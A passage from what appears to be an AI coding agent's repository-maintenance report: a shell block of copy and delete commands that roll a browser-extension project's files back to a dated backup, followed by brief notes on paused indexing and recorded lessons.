cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/known-issues.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/known-issues.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/logging.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/logging.md
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/maintenance-coverage-2026-11-12.json
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/onboarding.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/onboarding.md
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/repo-bootstrap-audit-2026-11-12.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/requirements.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/requirements.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/runbooks/encryption-lock-and-recovery.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/runbooks/encryption-lock-and-recovery.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/runbooks/load-and-reload-extension.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/runbooks/load-and-reload-extension.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/runbooks/peer-sync.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/runbooks/peer-sync.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/runbooks/release-packaging.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/runbooks/release-packaging.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/docs/runbooks/todo-sync-troubleshooting.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/runbooks/todo-sync-troubleshooting.md
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/docs/wiki/index.md
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/eslint.config.mjs
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/manifest.json /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/manifest.json
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/memory.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/memory.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/package-lock.json /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/package-lock.json
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/package.json /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/package.json
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/peer/README.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/peer/README.md
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/peer/peer_fixture.py
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/peer/stickysites-peer.py /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/peer/stickysites-peer.py
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/peer/test_peer.py /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/peer/test_peer.py
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/popout.html /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/popout.html
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/popout.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/popout.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/popup.css /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/popup.css
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/popup.html /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/popup.html
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/popup.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/popup.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/prompts.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/prompts.md
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/browser-checks.mjs
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/scripts/build-store-zip.mjs /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/build-store-zip.mjs
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/scripts/check-doc-indexes.mjs /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/check-doc-indexes.mjs
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/scripts/check-syntax.mjs /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/check-syntax.mjs
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/generate-docs.mjs
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/harness-resources.mjs
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/scripts/rotate-workflow-logs.mjs /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/rotate-workflow-logs.mjs
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/scripts/store-screenshots.mjs /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/store-screenshots.mjs
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/scripts/verify-live.mjs /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/scripts/verify-live.mjs
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/background/service-worker.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/background/service-worker.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/content/cluster.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/cluster.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/content/crypto-content.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/crypto-content.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/content/mentions.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/mentions.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/content/outline-ops.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/outline-ops.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/content/outline.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/outline.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/content/panel.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/panel.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/content/prefs.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/prefs.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/safe-html.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/content/sticky-inject.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/sticky-inject.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/storage-content.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/content/todo.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/content/todo.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/network.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/note-writer.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/shared/notes-storage.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/notes-storage.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/shared/peer-sync.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/peer-sync.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/settings.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/src/shared/todo-bridge.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/src/shared/todo-bridge.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/store/README.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/store/README.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/store/listing.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/store/listing.md
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/store/permissions-justifications.md /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/store/permissions-justifications.md
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/browser-integration.test.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/tests/crypto-vault-compat.test.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/crypto-vault-compat.test.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/helpers/runtime.js
cp -p /Users/mitch.hudson/.claude/skill-consolidation/backups/stickysites-20261112T0930/original/tests/notes-storage.test.js /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/notes-storage.test.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/popup-regressions.test.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/runtime-regressions.test.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/service-worker.test.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/sync-regressions.test.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling-browser.test.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling-docs.test.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling-harness.test.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/tooling.test.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/ui-boundaries.test.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/vault-import.test.js
rm /Users/mitch.hudson/dev/.repo-maintenance/20261112T081335Z/app-worktrees/stickysites/tests/vault-legacy.test.js
```

## 11. Index

index: n/a (outside semantic corpus roots). Repository text indexes are generated/checkable. Semantic indexing and embeddings remain paused; no corpus refresh or duplicate indexer was requested. Registry-only integration uses the supported project-manager CLI with preserved active status and the canonical primary path. Final readback and remote delivery are recorded in the external receipt.

## 12. Memory central

memory-central:3 lessons ·6 conventions consulted ·0 regression checks fired. Unrelated imported framework conventions were rejected. Durable source-bound decisions/lessons are recorded in Stele, including authoritative queue/CAS, vault staging, HTTP worker fallback and extension-origin credentials. No Codex memory file was edited.
